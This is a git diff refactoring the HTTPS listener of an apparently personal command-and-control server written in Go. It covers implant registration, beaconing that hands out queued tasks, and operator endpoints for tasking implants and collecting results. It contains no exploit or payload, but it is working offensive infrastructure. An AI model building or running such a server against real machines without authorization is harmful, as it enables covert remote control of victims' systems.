@@ -1,4 +1,4 @@
-package main
+package listener
 
 import (
 	"errors"
@@ -6,6 +6,7 @@ import (
 	"net/http"
 	"strconv"
 
+	"asritha.dev/c2server/pkg/model"
 	"github.com/gin-gonic/gin"
 	"gorm.io/gorm"
 )
@@ -14,14 +15,12 @@ type HTTPSListener struct {
 	db *gorm.DB
 }
 
-func (l *HTTPSListener) listen() {
+func (l *HTTPSListener) Listen() {
 	router := gin.Default()
-
-	// TODO: change these endpoints to /new, /cmd/task, etc. so it lines up w/ DNS?
 
 	// Implant endpoints (HTTPS listener)
 	implant := router.Group("/implant")
-	implant.POST("/register", l.Register)
+	implant.POST("/new", l.New)
 	implant.POST("/beacon", l.Beacon)
 
 	// Operator endpoints
@@ -39,19 +38,19 @@ func (l *HTTPSListener) listen() {
 	}
 }
 
-func (l *HTTPSListener) Register(c *gin.Context) {
-	var sysInfo SystemInfo
+func (l *HTTPSListener) New(c *gin.Context) {
+	var sysInfo model.SystemInfo
 	if err := c.ShouldBindJSON(&sysInfo); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
 
 	// Create Implant
-	implant := &Implant{
+	implant := &model.Implant{
 		SystemInfo:   sysInfo,
 		Dwell:        "30s",
 		Jitter:       0,
-		CommProtocol: DEFAULT_IMPLANT_COMM_PROTOCOL,
+		CommProtocol: HTTPS.String(), // TODO: should be DEFAULTCOMMPROTOCOL
 	}
 	if err := l.db.Create(implant).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
@@ -60,7 +59,7 @@ func (l *HTTPSListener) Register(c *gin.Context) {
 
 	c.JSON(http.StatusCreated, gin.H{
 		"id":            implant.ID,
-		"comm_protocol": implant.CommProtocol.String(),
+		"comm_protocol": implant.CommProtocol,
 		"config": gin.H{
 			"dwell":  implant.Dwell,
 			"jitter": implant.Jitter,
@@ -68,9 +67,10 @@ func (l *HTTPSListener) Register(c *gin.Context) {
 	})
 }
 
+// rename to BeaconHTTPSRequest
 type BeaconRequest struct {
-	ImplantID uint     `json:"implant-id"`
-	Results   []Result `json:"results"`
+	ImplantID uint           `json:"implant-id"`
+	Results   []model.Result `json:"results"`
 }
 
 func (l *HTTPSListener) Beacon(c *gin.Context) {
@@ -102,8 +102,9 @@ func (l *HTTPSListener) Beacon(c *gin.Context) {
 	c.JSON(http.StatusOK, newTasks)
 }
 
+// OPERATOR ENDPOINTS
 func (l *HTTPSListener) ListImplants(c *gin.Context) {
-	var implants []Implant
+	var implants []model.Implant
 	if err := l.db.Preload("Tasks").Preload("Tasks.Results").Find(&implants).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
@@ -113,7 +114,7 @@ func (l *HTTPSListener) ListImplants(c *gin.Context) {
 
 func (l *HTTPSListener) GetImplant(c *gin.Context) {
 	id := c.Param("id")
-	var implant Implant
+	var implant model.Implant
 	if err := l.db.Preload("Tasks").Preload("Tasks.Results").First(&implant, id).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "implant not found"})
 		return
@@ -122,7 +123,7 @@ func (l *HTTPSListener) GetImplant(c *gin.Context) {
 }
 func (l *HTTPSListener) ListTasks(c *gin.Context) {
 	id := c.Param("implant-id")
-	var tasks []Task
+	var tasks []model.Task
 	if err := l.db.Where("implant_id = ?", id).Preload("Results").Find(&tasks).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
@@ -149,7 +150,7 @@ func (l *HTTPSListener) GetTask(c *gin.Context) {
 	}
 
 	// fetch only if it belongs to that implant
-	var task Task
+	var task model.Task
 	if err = l.db.
 		Where("id = ? AND implant_id = ?", taskID, impID).Preload("Results").
 		First(&task).Error; err != nil {
@@ -162,7 +163,7 @@ func (l *HTTPSListener) GetTask(c *gin.Context) {
 
 func (l *HTTPSListener) AddTasks(c *gin.Context) {
 	id := c.Param("implant-id")
-	var implant Implant
+	var implant model.Implant
 	if err := l.db.
 		Preload("Tasks").
 		First(&implant, id).
@@ -170,7 +171,7 @@ func (l *HTTPSListener) AddTasks(c *gin.Context) {
 		c.JSON(http.StatusNotFound, gin.H{"error": "implant not found"})
 		return
 	}
-	var newTasks []Task
+	var newTasks []model.Task
 	if err := c.ShouldBindJSON(&newTasks); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
@@ -195,7 +196,7 @@ func (l *HTTPSListener) ListResults(c *gin.Context) {
 	id := c.Param("implant-id")
 
 	// get all tasks for implant
-	var tasks []Task
+	var tasks []model.Task
 	if err := l.db.
 		Preload("Results").
 		Where("implant_id = ?", id).
@@ -205,7 +206,7 @@ func (l *HTTPSListener) ListResults(c *gin.Context) {
 	}
 
 	// collect results
-	var results []Result
+	var results []model.Result
 	for _, t := range tasks {
 		results = append(results, t.Result)
 	}
